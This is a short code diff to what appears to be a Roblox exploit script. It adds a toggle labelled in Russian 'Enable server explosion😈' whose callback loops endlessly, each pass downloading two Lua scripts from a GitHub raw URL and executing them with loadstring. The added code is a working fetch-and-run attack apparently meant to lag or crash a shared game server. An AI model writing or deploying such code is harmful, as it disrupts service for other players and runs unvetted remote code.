@@ -11,6 +11,12 @@ Tab:AddToggle({
 	Name = "Включить взрыв сервера😈",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		SlapstickSpam = Value
+		while SlapstickSpam do
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bendyshechka/GGGLAG/refs/heads/main/antilag.lua"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bendyshechka/GGGLAG/refs/heads/main/slapstick.lua"))()
+		wait(1)
+		task.wait()
+end
 	end    
 })
